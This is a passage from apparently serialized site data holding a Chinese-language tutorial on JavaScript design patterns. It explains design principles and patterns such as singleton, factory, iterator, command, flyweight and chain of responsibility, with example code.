实现职责链",charIndex:19866},{level:2,title:"中介者模式",slug:"中介者模式",normalizedTitle:"中介者模式",charIndex:20419},{level:3,title:"适用场景",slug:"适用场景-2",normalizedTitle:"适用场景",charIndex:8237},{level:3,title:"中介模式的优缺点",slug:"中介模式的优缺点",normalizedTitle:"中介模式的优缺点",charIndex:20814},{level:3,title:"简单案例",slug:"简单案例-3",normalizedTitle:"简单案例",charIndex:1427},{level:2,title:"装饰者模式",slug:"装饰者模式",normalizedTitle:"装饰者模式",charIndex:21633},{level:3,title:"使用",slug:"使用",normalizedTitle:"使用",charIndex:207},{level:3,title:"AOP(面向切面编程)装饰函数",slug:"aop-面向切面编程-装饰函数",normalizedTitle:"aop(面向切面编程)装饰函数",charIndex:22447},{level:3,title:"缺点",slug:"缺点-3",normalizedTitle:"缺点",charIndex:11285},{level:3,title:"使用场景",slug:"使用场景-2",normalizedTitle:"使用场景",charIndex:11033},{level:2,title:"策略模式(算法簇模式)",slug:"策略模式-算法簇模式",normalizedTitle:"策略模式(算法簇模式)",charIndex:23608},{level:3,title:"简单案例",slug:"简单案例-4",normalizedTitle:"简单案例",charIndex:1427},{level:3,title:"策略模式优缺点",slug:"策略模式优缺点",normalizedTitle:"策略模式优缺点",charIndex:24178},{level:2,title:"代理模式",slug:"代理模式",normalizedTitle:"代理模式",charIndex:24398},{level:3,title:"虚拟代理",slug:"虚拟代理",normalizedTitle:"虚拟代理",charIndex:24503},{level:3,title:"缓存代理",slug:"缓存代理",normalizedTitle:"缓存代理",charIndex:26458},{level:3,title:"其他代理模式",slug:"其他代理模式",normalizedTitle:"其他代理模式",charIndex:26876},{level:3,title:"使用场景",slug:"使用场景-3",normalizedTitle:"使用场景",charIndex:11033},{level:2,title:"观察者模式(订阅/发布模式)(Vue的双向绑定原理就是基于此模式)",slug:"观察者模式-订阅-发布模式-vue的双向绑定原理就是基于此模式",normalizedTitle:"观察者模式(订阅/发布模式)(vue的双向绑定原理就是基于此模式)",charIndex:27331},{level:3,title:"适用于以下场景",slug:"适用于以下场景",normalizedTitle:"适用于以下场景",charIndex:27511},{level:3,title:"观察者模式的优缺点",slug:"观察者模式的优缺点",normalizedTitle:"观察者模式的优缺点",charIndex:27652},{level:3,title:"观察者模式与中介者模式的区别",slug:"观察者模式与中介者模式的区别",normalizedTitle:"观察者模式与中介者模式的区别",charIndex:27943},{level:3,title:"简单案例",slug:"简单案例-5",normalizedTitle:"简单案例",charIndex:1427},{level:2,title:"状态模式",slug:"状态模式",normalizedTitle:"状态模式",charIndex:30702},{level:3,title:"简单的案例",slug:"简单的案例",normalizedTitle:"简单的案例",charIndex:30847},{level:3,title:"状态模式的定义",slug:"状态模式的定义",normalizedTitle:"状态模式的定义",charIndex:32539},{level:3,title:"状态模式的通用结构",slug:"状态模式的通用结构",normalizedTitle:"状态模式的通用结构",charIndex:32813},{level:3,title:"状态模式的优缺点",slug:"状态模式的优缺点",normalizedTitle:"状态模式的优缺点",charIndex:32934},{level:3,title:"状态模式和策略模式的关系",slug:"状态模式和策略模式的关系",normalizedTitle:"状态模式和策略模式的关系",charIndex:33203},{level:2,title:"适配器模式",slug:"适配器模式",normalizedTitle:"适配器模式",charIndex:33353},{level:3,title:"总结",slug:"总结-2",normalizedTitle:"总结",charIndex:12340}],headersStr:"什么是设计模式? 为什么使用设计模式 设计模式的六大原则 单体模式(单例模式) 简单案例 适用场合 工厂模式 简单工程模式 工厂方法模式 抽象工厂模式 使用场合 迭代器模式 内部迭代器 外部迭代器 倒序迭代器 中止迭代器 使用场合 命令模式 适用场景 简单案例 组合模式 经典案例 使用场景 缺点 模板方法模式 组成部分 使用场景例子 好莱坞原则 除此之外，好莱坞原则还常常应用于其他模式和场景，例如发布订阅模式和回调函数。 总结 享元模式 内部状态与外部状态 区分内部状态与外部状态 例子（享元模式文件上传） 享元模式的适用性 对象池 小结 职责链模式 现实中的职责链模式 开发中的职责链模式 异步的职责链 用 AOP 实现职责链 中介者模式 适用场景 中介模式的优缺点 简单案例 装饰者模式 使用 AOP(面向切面编程)装饰函数 缺点 使用场景 策略模式(算法簇模式) 简单案例 策略模式优缺点 代理模式 虚拟代理 缓存代理 其他代理模式 使用场景 观察者模式(订阅/发布模式)(Vue的双向绑定原理就是基于此模式) 适用于以下场景 观察者模式的优缺点 观察者模式与中介者模式的区别 简单案例 状态模式 简单的案例 状态模式的定义 状态模式的通用结构 状态模式的优缺点 状态模式和策略模式的关系 适配器模式 总结",content:"# JavaScript设计模式\n\n\n# 什么是设计模式?\n\n模式是一种可复用的解决方案，可用于解决项目中遇到的常见问题，将解决问题的方法制作成模板，并且这些模板可应用于多种不同的情况。如在编写的JavaScript应用程序的实例中，同类型问题共用一种解决方法。\n所有设计模式都有一个共同的目的，那就是让编程更加模块化，系统化，明确化。 在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。\n\n\n# 为什么使用设计模式\n\n 1. 使用已经验证的解决方案，可以快速可靠解决项目开发中遇到的问题\n 2. 复用代码，使代码更加简洁\n\n\n# 设计模式的六大原则\n\n总原则－开闭原则\n\n对扩展开放，对修改封闭。 在程序需要进行拓展的时候，不能去修改原有的代码，而是要扩展原有代码，实现一个热插拔的效果。所以一句话概括就是：为了使程序的扩展性好，易于维护和升级。 想要达到这样的效果，我们需要使用接口和抽象类等。\n\n 1. 单一职责原则 不要存在多于一个导致类变更的原因，也就是说每个类应该实现单一的职责，否则就应该把类拆分。\n\n 2. 里氏替换原则（Liskov Substitution Principle） 任何基类可以出现的地方，子类一定可以出现。里氏替换原则是继承复用的基石，只有当衍生类可以替换基类，软件单位的功能不受到影响时，基类才能真正被复用，而衍生类也能够在基类的基础上增加新的行为。 里氏代换原则是对“开-闭”原则的补充。实现“开闭”原则的关键步骤就是抽象化。而基类与子类的继承关系就是抽象化的具体实现，所以里氏代换原则是对实现抽象化的具体步骤的规范。里氏替换原则中，子类对父类的方法尽量不要重写和重载。因为父类代表了定义好的结构，通过这个规范的接口与外界交互，子类不应该随便破坏它。\n\n 3. 依赖倒转原则（Dependence Inversion Principle） 面向接口编程，依赖于抽象而不依赖于具体。写代码时用到具体类时，不与具体类交互，而与具体类的上层接口交互。\n\n 4. 接口隔离原则（Interface Segregation Principle） 每个接口中不存在子类用不到却必须实现的方法，如果不然，就要将接口拆分。使用多个隔离的接口，比使用单个接口（多个接口方法集合到一个的接口）要好。\n\n 5. 迪米特法则（最少知道原则）（Demeter Principle） 一个类对自己依赖的类知道的越少越好。无论被依赖的类多么复杂，都应该将逻辑封装在方法的内部，通过public方法提供给外部。这样当被依赖的类变化时，才能最小的影响该类。 最少知道原则的另一个表达方式是：只与直接的朋友通信。类之间只要有耦合关系，就叫朋友关系。耦合分为依赖、关联、聚合、组合等。我们称出现为成员变量、方法参数、方法返回值中的类为直接朋友。局部变量、临时变量则不是直接的朋友。我们要求陌生的类不要作为局部变量出现在类中。\n\n 6. 合成复用原则（Composite Reuse Principle） 尽量首先使用合成/聚合的方式，而不是使用继承。\n\n\n# 单体模式(单例模式)\n\n单体模式 就是保证一个类仅有一个实例，例如浏览器中的window对象。实际上，在事项对象的字面量创建对象时，就是正在创建一个单体。\n单体模式（Singleton Pattern）就是确保某一个类只有一个实例，而且自行实例化并向整个系统提供这个实例。\n\n\n# 简单案例\n\n> 单例模式的实现是一个变量来标志当前是否已经为某个类创建过对象，如果是，则在下一次获取该类的实例时，直接返回之前创建的对象。\n\nvar Single = (function() {\n    var instance;\n\n    function init() {\n        //define private methods and properties\n        //do something\n        return {\n            //define public methods and properties\n        };\n    }\n\n    return {\n        // 获取实例\n        getInstance: function() {\n            if (!instance) {\n                instance = init();\n            }\n            return instance;\n        }\n    }\n})();\n\nvar obj1 = Single.getInstance();\nvar obj2 = Single.getInstance();\n\nconsole.log(obj1 === obj2); //true\n\n\n\n# 适用场合\n\n * 在 JavaScript开发中，单体模式的用途同样非常广泛。试想一下，当单击登录按钮的时候，页面中会出现一个登录浮窗，而这个登录浮窗是唯一的，无论单击多少次登录按钮，这个浮窗都只会被创建一次，那么这个登录浮窗就适合用单体模式来创建。\n * 要求生成唯一序列号的环境\n * 整个项目需要一个共享访问点或共享数据\n * 创建一个对象消耗资源过多\n\n\n# 工厂模式\n\n工厂模式是用来创建对象的一种最常用的设计模式。不暴露创建对象的具体逻辑，而是将将逻辑封装在一个函数中，那么这个函数就可以被视为一个工厂。\n工厂模式分为三种：简单工厂模式、工厂方法模式、抽象工厂模式\n\n\n# 简单工程模式\n\n简单工厂模式又叫静态工厂模式，由一个工厂对象决定创建某一种产品对象类的实例。主要用来创建同一类对象。对于非大型的前端应用来说，灵活使用简单工厂其实就能解决大部分问题。\n\n简单工厂只能作用于创建的对象数量较少，对象的创建逻辑不复杂时使用。\n\n//User类\nclass User {\n    //构造器\n    constructor(opt) {\n        this.name = opt.name;\n        this.viewPage = opt.viewPage;\n    }\n\n    //静态方法\n    static getInstance(role) {\n        switch (role) {\n            case 'superAdmin':\n                return new User({\n                    name: '超级管理员',\n                    viewPage: ['首页', '通讯录', '发现页', '应用数据', '权限管理']\n                });\n                break;\n            case 'admin':\n                return new User({\n                    name: '管理员',\n                    viewPage: ['首页', '通讯录', '发现页', '应用数据']\n                });\n                break;\n            case 'user':\n                return new User({\n                    name: '普通用户',\n                    viewPage: ['首页', '通讯录', '发现页']\n                });\n                break;\n            default:\n                throw new Error('参数错误, 可选参数:superAdmin、admin、user')\n        }\n    }\n}\n//调用\nlet superAdmin = User.getInstance('superAdmin');\nlet admin = User.getInstance('admin');\nlet normalUser = User.getInstance('user');\nconsole.log(superAdmin);\nconsole.log(admin);\nconsole.log(normalUser);\n\n\n\n# 工厂方法模式\n\n与简单工厂模式相比，主要区别就是它不是另外使用一个对象或者类来创建实例，而是使用一个子类。工厂是一个将其成员对象的实例化推迟到子类中进行的类。\n\nclass User {\n    constructor(name = '', viewPage = []) {\n        //new.target属性允许你检测函数或构造方法是否是通过new运算符被调用的。在通过new运算符被初始化的函数或构造方法中，new.target返回一个指向构造方法或函数的引用。在普通的函数调用中，new.target 的值是undefined。\n        if (new.target === User) {\n            throw new Error('抽象类不能实例化!');\n        }\n        this.name = name;\n        this.viewPage = viewPage;\n    }\n}\nclass UserFactory extends User {\n    constructor(name, viewPage) {\n        super(name, viewPage)\n    }\n    create(role) {\n        switch (role) {\n            case 'superAdmin':\n                return new UserFactory('超级管理员', ['首页', '通讯录', '发现页', '应用数据', '权限管理']);\n                break;\n            case 'admin':\n                return new UserFactory('普通用户', ['首页', '通讯录', '发现页']);\n                break;\n            case 'user':\n                return new UserFactory('普通用户', ['首页', '通讯录', '发现页']);\n                break;\n            default:\n                throw new Error('参数错误, 可选参数:superAdmin、admin、user')\n        }\n    }\n}\nlet userFactory = new UserFactory();\nlet superAdmin = userFactory.create('superAdmin');\nlet admin = userFactory.create('admin');\nlet user = userFactory.create('user');\n\n\n\n# 抽象工厂模式\n\n抽象工厂模式并不直接生成实例，而是用于对产品类簇的创建, 不负责创建某一类产品的实例。\n\nclass User {\n    constructor(type) {\n        if (new.target === User) {\n            throw new Error('抽象类不能实例化!')\n        }\n        this.type = type;\n    }\n}\n\nclass UserOfWechat extends User {\n    constructor(name) {\n        super('wechat');\n        this.name = name;\n        this.viewPage = ['首页', '通讯录', '发现页']\n    }\n}\n\nclass UserOfQq extends User {\n    constructor(name) {\n        super('qq');\n        this.name = name;\n        this.viewPage = ['首页', '通讯录', '发现页']\n    }\n}\n\nclass UserOfWeibo extends User {\n    constructor(name) {\n        super('weibo');\n        this.name = name;\n        this.viewPage = ['首页', '通讯录', '发现页']\n    }\n}\n\nfunction getAbstractUserFactory(type) {\n    switch (type) {\n        case 'weixin':\n            return UserOfWechat;\n            break;\n        case 'qq':\n            return UserOfQq;\n            break;\n        case 'weibo':\n            return UserOfWeibo;\n            break;\n        default:\n            throw new Error('参数错误, 可选参数:weixin  qq  weibo')\n    }\n}\nlet WechatUserClass = getAbstractUserFactory('weixin');\nlet QqUserClass = getAbstractUserFactory('qq');\nlet WeiboUserClass = getAbstractUserFactory('weibo');\n\nlet wechatUser = new WechatUserClass('微信小孙');\nlet qqUser = new QqUserClass('QQ老马');\nlet weiboUser = new WeiboUserClass('微博小李');\nconsole.log(wechatUser)\nconsole.log(qqUser)\nconsole.log(weiboUser)\n\n\n\n# 使用场合\n\n * 创建一些用不同方式实现统一接口的对象，那么可以使用一个工厂方法或者简单工厂对象来简化实现过程。\n * 对象要进行复杂的并且彼此相关的设置的时候，那么工厂模式可以很显著的减少每种对象的代码量。将特定的设置代码提取出来会使得代码有极大地提升。并且能优化结构便于维护。\n * 许多小型对象组成一个大对象\n\n\n# 迭代器模式\n\n提供一种方法顺序访问一个聚合对象中的各个元素，而又不需要暴露该对象的内部表示。javascript内置了迭代器==>JavaScript 的 Array.prototype.forEach\n\n\n# 内部迭代器\n\n已经定义好了迭代规则，它完全接手整个迭代过程，外部只需一次初始调用。\n\n# jQuery中的迭代器\n\n$.each([1, 2, 3], function(i, n) {\n    console.log(\"当前下标为：\" + i + \" 当前元素为：\" + n);\n});\n\n\n# 原生javascript实现\n\nvar each = function(ary, callback) {\n    for (var i = 0, l = ary.length; i < l; i++) {\n        callback.call(ary[i], i, ary[i]);\n    }\n};\neach([1, 2, 3], function(i, n) {\n    console.log(\"当前下标为：\" + i + \" 当前元素为：\" + n);\n});\n\n\n\n# 外部迭代器\n\n必须显式地请求迭代下一个元素。 外部迭代器虽然调用方式相对复杂，但它的适用面更广，也能满足更多变的需求。内部迭代 器和外部迭代器在实际生产中没有优劣之分，究竟使用哪个要根据需求场景而定。\n\n// 外部迭代器\nvar Iterator = function(obj) {\n    var current = 0,\n        next = function() {\n            current++;\n        },\n        isDone = function() {\n            return current > obj.length;\n        },\n        getCurrentItem = function() {\n            return obj[current];\n        };\n    return {\n        next: next,\n        isDone: isDone,\n        getCurrentItem: getCurrentItem\n    };\n};\n// 比较函数\nvar compareAry = function(iterator1, iterator2) {\n    while (!iterator1.isDone() && !iterator2.isDone()) { //判断两个数组是否为最后一位\n        if (iterator1.getCurrentItem() !== iterator2.getCurrentItem()) {\n            throw new Error(\"不相等\");\n        }\n        iterator1.next(); //比较数组的下一个\n        iterator2.next(); //比较数组的下一个\n    }\n    console.log(\"相等\");\n}\ncompareAry(new Iterator([1, 2, 3]), new Iterator([1, 2, 3]));\n\n\n\n# 倒序迭代器\n\nvar reverseEach = function(ary, callback) {\n    for (var l = ary.length - 1; l >= 0; l--) {\n        callback(l, ary[l]);\n    }\n};\nreverseEach([0, 1, 2], function(i, n) {\n    console.log(n); // 分别输出：2, 1 ,0 \n});\n\n\n\n# 中止迭代器\n\n> 迭代器可以像普通 for 循环中的 break 一样，提供一种跳出循环的方法\n\n\n# 使用场合\n\n对于集合内部结果常常变化各异，我们不想暴露其内部结构的话，但又响让客户代码透明底访问其中的元素，这种情况下我们可以使用迭代器模式。\n\n迭代器模式是一种相对简单的模式，简单到很多时候我们都不认为它是一种设计模式。目前的绝大部分语言都内置了迭代器。\n\n\n# 命令模式\n\n命令模式是最简单和优雅的模式之一，命令模式中的命令（command）指的是一个执行某些 特定事情的指令。\n\n\n# 适用场景\n\n有时候需要向某些对象发送请求，但是并不知道请求的接收者是谁，也不知道被请求的操作是什么。此时希望用一种松耦合的方式来设计程序，使得请求发送者和请求接收者能够消除彼此之间的耦合关系\n\n\n# 简单案例\n\n> 命令模式的由来，其实是回调（callback）函数的一个面向对象的替代品。\n\nvar setCommand = function(button, command) {\n    button.onclick = function() {\n        command.execute();\n    }\n};\nvar MenuBar = {\n    refresh: function() {\n        console.log('刷新菜单目录');\n    }\n};\nvar SubMenu = {\n    add: function() {\n        console.log('增加子菜单');\n    },\n    del: function() {\n        console.log('删除子菜单');\n    }\n};\nvar RefreshMenuBarCommand = function(receiver) {\n    this.receiver = receiver;\n};\nRefreshMenuBarCommand.prototype.execute = function() {\n    this.receiver.refresh();\n};\nvar AddSubMenuCommand = function(receiver) {\n    this.receiver = receiver;\n};\nAddSubMenuCommand.prototype.execute = function() {\n    this.receiver.add();\n};\nvar DelSubMenuCommand = function(receiver) {\n    this.receiver = receiver;\n};\nDelSubMenuCommand.prototype.execute = function() {\n    console.log('删除子菜单');\n};\n\nvar refreshMenuBarCommand = new RefreshMenuBarCommand(MenuBar);\nvar addSubMenuCommand = new AddSubMenuCommand(SubMenu);\nvar delSubMenuCommand = new DelSubMenuCommand(SubMenu);\nsetCommand(button1, refreshMenuBarCommand);\nsetCommand(button2, addSubMenuCommand);\nsetCommand(button3, delSubMenuCommand);\n\n\n> 使用闭包也能实现\n\nvar setCommand = function(button, func) {\n    button.onclick = function() {\n        func();\n    }\n};\nvar MenuBar = {\n    refresh: function() {\n        console.log('刷新菜单界面');\n    }\n};\nvar RefreshMenuBarCommand = function(receiver) {\n    return function() {\n        receiver.refresh();\n    }\n};\nvar refreshMenuBarCommand = RefreshMenuBarCommand(MenuBar);\nsetCommand(button1, refreshMenuBarCommand);\n\n\n\n# 组合模式\n\n将对象组合成树形结构以表示“部分-整体”的层次结构，组合模式使得用户对单个对象和组合对象的使用具有一致性。\n组合模式主要有三个角色：\n\n 1. 抽象组件（Component）：抽象类，主要定义了参与组合的对象的公共接口\n 2. 子对象（Leaf）：组成组合对象的最基本对象\n 3. 组合对象（Composite）：由子对象组合起来的复杂对象\n\n\n# 经典案例\n\n假设我们开发一个旅游产品网站，其中包含机票和酒店两种子产品，我们定义了子对象如下：\n\nfunction FlightOrder() {}\nFlightOrder.prototype.create = function() {\n    console.log(\"flight order created\");\n}\n\nfunction HotelOrder() {}\nHotelOrder.prototype.create = function() {\n    console.log(\"hotel order created\");\n}\n\n\n上面的代码定义了两个类：机票订单类和酒店订单类，每个类都有各自的订单创建方法。\n接下来我们创建一个总订单类：\n\nfunction TotalOrders() {\n    this.orderList = [];\n}\nTotalOrders.prototype.addOrder = function(order) {\n    this.orderList.push(order);\n}\nTotalOrders.prototype.create = function(order) {\n    for (var i = 0, length = this.orderList.length; i < length; i++) {\n        this.orderList[i].create();\n    }\n}\n\n\n这个对象主要有3个成员：订单列表，添加订单的方法，创建订单的方法。\n在客户端使用的时候如下：\n\nvar flight = new FlightOrder();\nflight.create();\n\nvar orders = new TotalOrders();\norders.addOrder(new FlightOrder());\norders.addOrder(new HotelOrder());\norders.create();\n\n\n客户端调用展示了两种方式，一种是单一的创建机票订单，一种是创建多张订单，但最终都是通过create方法进行创建，这就是一个很典型的组合模式的应用场景。\n\n\n# 使用场景\n\n 1. 想表示对象的部分-整体层次结构时.组合模式可以方便地构造一棵树来表示对象的部分整 体结构。特别是我们在开发期间不确定这棵树到底存在多少层次的时候。在树的构造最 终完成之后，只需要通过请求树的最顶层对象，便能对整棵树做统一的操作。在组合模 式中增加和删除树的节点非常方便，并且符合开放封闭原则。\n\n 2. 希望用户忽略组合对象和单个对象的不同，用户将统一地使用组合结构中的所有对象（方法）\n\n 3. 对象具有明显的层次结构并且想要统一地使用它们，这就非常适合使用组合模式。\n\n\n# 缺点\n\n> 组合模式并不是完美的，它可能会产生一个这样的系统：系统中的每个对象看起来都\n\n与其他对象差不多。它们的区别只有在运行的时候会才会显现出来，这会使代码难以理解。此外， 如果通过组合模式创建了太多的对象，那么这些对象可能会让系统负担不起。\n\n\n# 模板方法模式\n\n> 模板方法模式是一种只需使用继承就可以实现的非常简单的模式。\n\n\n# 组成部分\n\n * 抽象父类\n * 具体的实现子类\n\n> 在抽象父类中封装了子类的算法框架，包括实现一些公共方法以及封装子类中所有方法的执行顺\n\n序。子类通过继承这个抽象类，也继承了整个算法结构，并且可以选择重写父类的方法。\n\n\n# 使用场景例子\n\n> 比如我们在构建一系列的 UI 组件，这些组件的构建过程一般如下所示：\n\n * (1) 初始化一个 div 容器；\n * (2) 通过 ajax 请求拉取相应的数据；\n * (3) 把数据渲染到 div 容器里面，完成组件的构造；\n * (4) 通知用户组件渲染完毕。\n\n我们看到，任何组件的构建都遵循上面的 4 步，其中第(1)步和第(4)步是相同的。第(2)步不 同的地方只是请求 ajax 的远程地址，第(3)步不同的地方是渲染数据的方式。\n\n于是我们可以把这 4 个步骤都抽象到父类的模板方法里面，父类中还可以顺便提供第(1)步和 第(4)步的具体实现。当子类继承这个父类之后，会重写模板方法里面的第(2)步和第(3)步\n\n\n# 好莱坞原则\n\n> 好莱坞无疑是演员的天堂，但好莱坞也有很多找不到工作的新人演员，许多新人演员在好莱\n\n坞把简历递给演艺公司之后就只有回家等待电话。有时候该演员等得不耐烦了，给演艺公司打电 话询问情况，演艺公司往往这样回答：“不要来找我，我会给你打电话。”\n\n\n# 除此之外，好莱坞原则还常常应用于其他模式和场景，例如发布订阅模式和回调函数。\n\n# 发布—订阅模式\n\n> 在发布—订阅模式中，发布者会把消息推送给订阅者，这取代了原先不断去 fetch 消息的形式。\n\n# 回调函数\n\n> 在 ajax 异步请求中，由于不知道请求返回的具体时间，而通过轮询去判断是否返回数据，这\n\n显然是不理智的行为。所以我们通常会把接下来的操作放在回调函数中，传入发起 ajax 异步请求 的函数。当数据返回之后，这个回调函数才被执行，这也是好莱坞原则的一种体现。把需要执行 的操作封装在回调函数里，然后把主动权交给另外一个函数。至于回调函数什么时候被执行，则 是另外一个函数控制的。\n\n\n# 总结\n\n模板方法模式是一种典型的通过封装变化提高系统扩展性的设计模式。在传统的面向对象语 言中，一个运用了模板方法模式的程序中，子类的方法种类和执行顺序都是不变的，所以我们把 这部分逻辑抽象到父类的模板方法里面。而子类的方法具体怎么实现则是可变的，于是我们把这 部分变化的逻辑封装到子类中。通过增加新的子类，我们便能给系统增加新的功能，并不需要改 动抽象父类以及其他子类，这也是符合开放封闭原则的。\n\nTIP\n\n高阶函数是更好的选择\n\n\n# 享元模式\n\n> 享元（flyweight）模式是一种用于性能优化的模式，“fly”在这里是苍蝇的意思，意为蝇量\n\n级。享元模式的核心是运用共享技术来有效支持大量细粒度的对象。\n\n\n# 内部状态与外部状态\n\n> 享元模式要求将对象的属性划分为内部状态与外部\n\n状态（状态在这里通常指属性）。享元模式的目标是尽量减少共享对象的数量.\n\n * 内部状态存储于对象内部。\n * 内部状态可以被一些对象共享。\n * 内部状态独立于具体的场景，通常不会改变。\n * 外部状态取决于具体的场景，并根据场景而变化，外部状态不能被共享。 这样一来，我们便可以把所有内部状态相同的对象都指定为同一个共享的对象。而外部状态 可以从对象身上剥离出来，并储存在外部。\n\nTIP\n\n剥离了外部状态的对象成为共享对象，外部状态在必要时被传入共享对象来组装成一个完整 的对象。虽然组装外部状态成为一个完整对象的过程需要花费一定的时间，但却可以大大减少系 统中的对象数量，相比之下，这点时间或许是微不足道的。因此，享元模式是一种用时间换空间 的优化模式。\n\n\n# 区分内部状态与外部状态\n\n> 可以被对象共享的属性通常被划分为内部状态 而外部状态取决于具体的场景，并根据场景而变化，它们不能被一些对象共享，因此只能被划分为外部状态。\n\n\n# 例子（享元模式文件上传）\n\n需求：封装多种类型上传文件。多种类型的方法不同。\n\n分析：不同类型的上传根据 uploadType 值得不同，分别来自两个不同的对象。\n\n 一旦明确了 `uploadType` ，无论我们使用什么方式上传，这个上传对象都是可以被任何文件共\n\n\n用的。而 fileName 和 fileSize 是根据场景而变化的，每个文件的 fileName 和 fileSize 都不一样， fileName 和 fileSize 没有办法被共享，它们只能被划分为外部状态。\n\n实现：\n\n// Upload 构造函数中只保留 uploadType 参数：\nvar Upload = function(uploadType) {\n    this.uploadType = uploadType;\n};\nUpload.prototype.delFile = function(id) {\n    uploadManager.setExternalState(id, this); // (1) \n    if (this.fileSize < 3000) {\n        return this.dom.parentNode.removeChild(this.dom);\n    }\n    if (window.confirm('确定要删除该文件吗? ' + this.fileName)) {\n        return this.dom.parentNode.removeChild(this.dom);\n    }\n};\n// 工厂进行对象实例化\nvar UploadFactory = (function() {\n    var createdFlyWeightObjs = {};\n    return {\n        create: function(uploadType) {\n            if (createdFlyWeightObjs[uploadType]) {\n                return createdFlyWeightObjs[uploadType];\n            }\n            return createdFlyWeightObjs[uploadType] = new Upload(uploadType);\n        }\n    }\n})();\n\n// 管理器封装外部状态\n\n// 它负责向 UploadFactory 提交创建对象的请求，\n// 并用一个 uploadDatabase 对象保存所有 upload 对象的外部状态，以便在程序运行过程中给\n// upload 共享对象设置外部状态，代码如下：\nvar uploadManager = (function() {\n    var uploadDatabase = {};\n    return {\n        add: function(id, uploadType, fileName, fileSize) {\n            var flyWeightObj = UploadFactory.create(uploadType);\n            var dom = document.createElement('div');\n            dom.innerHTML =\n                '<span>文件名称:' + fileName + ', 文件大小: ' + fileSize + '</span>' +\n                '<button class=\"delFile\">删除</button>';\n            dom.querySelector('.delFile').onclick = function() {\n                flyWeightObj.delFile(id);\n            }\n            document.body.appendChild(dom);\n            uploadDatabase[id] = {\n                fileName: fileName,\n                fileSize: fileSize,\n                dom: dom\n            };\n            return flyWeightObj;\n        },\n        setExternalState: function(id, flyWeightObj) {\n            var uploadData = uploadDatabase[id];\n            for (var i in uploadData) {\n                flyWeightObj[i] = uploadData[i];\n            }\n        }\n    }\n})();\n\n\n\n# 享元模式的适用性\n\n> 享元模式带来的好处很大程度上取决于如何使用以及何时使用，一般来说，以下情况发生时\n\n便可以使用享元模式。\n\n * 一个程序中使用了大量的相似对象。\n * 由于使用了大量对象，造成很大的内存开销。\n * 对象的大多数状态都可以变为外部状态。\n * 剥离出对象的外部状态之后，可以用相对较少的共享对象取代大量对象。 可以看到，文件上传的例子完全符合这四点。\n\n\n# 对象池\n\n> 对象池维护一个装载空闲对象的池子，如果需要对象的时候，不是直接 new，而是转从对象池里获取。如\n\n果对象池里没有空闲对象，则创建一个新的对象，当获取出的对象完成它的职责之后， 再进入 池子等待被下次获取。\n\n\n# 小结\n\n享元模式是为解决性能问题而生的模式，这跟大部分模式的诞生原因都不一样。在一个存在 大量相似对象的系统中，享元模式可以很好地解决大量对象带来的性能问题。\n\n\n# 职责链模式\n\n> 使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系，将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止。\n\n\n# 现实中的职责链模式\n\n> 如果早高峰能顺利挤上公交车的话，那么估计这一天都会过得很开心。因为公交车上人\n\n实在太多了，经常上车后却找不到售票员在哪，所以只好把两块钱硬币往前面递。除非 你运气够好，站在你前面的第一个人就是售票员，否则，你的硬币通常要在 N 个人手上 传递，才能最终到达售票员的手里。\n\n> 中学时代的期末考试，如果你平时不太老实，考试时就会被安排在第一个位置。遇到不\n\n会答的题目，就把题目编号写在小纸条上往后传递，坐在后面的同学如果也不会答，他 就会把这张小纸条继续递给他后面的人。\n\n> \n\n\n\n\n# 开发中的职责链模式\n\n# 开发需求\n\n * 一个售卖手机的电商网站，经过分别交纳 500 元定金和 200 元定金的两轮预定后（订单已在此时生成），现在已经到了正式购买的阶段\n * 支付过 500 元 100优惠价 下单后库存不判断\n * 支付过 200 元 50优惠价 下单后库存不判断\n * 支付 0元 没有优惠价 库存为0不可购买\n\n# 完成逻辑\n\n * orderType：表示订单类型（定金用户或者普通购买用户），code 的值为 1 的时候是 500 元 定金用户，为 2 的时候是 200 元定金用户，为 3 的时候是普通购买用户。\n * pay：表示用户是否已经支付定金，值为 true 或者 false, 虽然用户已经下过 500 元定金的 订单，但如果他一直没有支付定金，现在只能降级进入普通购买模式。\n * stock：表示当前用于普通购买的手机库存数量，已经支付过 500 元或者 200 元定金的用 户不受此限制。\n\n缺点：不易读 不易修改\n\nvar order = function(orderType, pay, stock) {\n    if (orderType === 1) { // 500 元定金购买模式\n        if (pay === true) { // 已支付定金\n            console.log('500 元定金预购, 得到 100 优惠券');\n        } else { // 未支付定金，降级到普通购买模式\n            if (stock > 0) { // 用于普通购买的手机还有库存\n                console.log('普通购买, 无优惠券');\n            } else {\n                console.log('手机库存不足');\n            }\n        }\n    } else if (orderType === 2) { // 200 元定金购买模式\n        if (pay === true) {\n            console.log('200 元定金预购, 得到 50 优惠券');\n        } else {\n            if (stock > 0) {\n                console.log('普通购买, 无优惠券');\n            } else {\n                console.log('手机库存不足');\n            }\n        }\n    } else if (orderType === 3) {\n        if (stock > 0) {\n            console.log('普通购买, 无优惠券');\n        } else {\n            console.log('手机库存不足');\n        }\n    }\n};\norder(1, true, 500); // 输出： 500 元定金预购, 得到 100 优惠券\n\n\n职责链模式重构代码\n\n// 定义三种购买的模式\nvar order500 = function(orderType, pay, stock) {\n    if (orderType === 1 && pay === true) {\n        console.log('500 元定金预购，得到 100 优惠券');\n    } else {\n        return 'nextSuccessor'; // 我不知道下一个节点是谁，反正把请求往后面传递\n    }\n};\nvar order200 = function(orderType, pay, stock) {\n    if (orderType === 2 && pay === true) {\n        console.log('200 元定金预购，得到 50 优惠券');\n    } else {\n        return 'nextSuccessor'; // 我不知道下一个节点是谁，反正把请求往后面传递\n    }\n};\nvar orderNormal = function(orderType, pay, stock) {\n    if (stock > 0) {\n        console.log('普通购买，无优惠券');\n    } else {\n        console.log('手机库存不足');\n    }\n};\n// 把函数包装进职责链节点，我们定义一个构造函数 Chain，在 new Chain 的时候传\n// 递的参数即为需要被包装的函数，同时它还拥有一个实例属性 this.successor，表示在链中的下\n// 一个节点\n\n// Chain 的 prototype 中还有两个函数\n// Chain.prototype.setNextSuccessor 指定在链中的下一个节点\n// Chain.prototype.passRequest 传递请求给某个节点\nvar Chain = function(fn) {\n    this.fn = fn;\n    this.successor = null;\n};\nChain.prototype.setNextSuccessor = function(successor) {\n    return this.successor = successor;\n};\nChain.prototype.passRequest = function() {\n    var ret = this.fn.apply(this, arguments);\n    if (ret === 'nextSuccessor') {\n        return this.successor && this.successor.passRequest.apply(this.successor, arguments);\n    }\n    return ret;\n};\n\n// 现在我们把 3 个订单函数分别包装成职责链的节点：\nvar 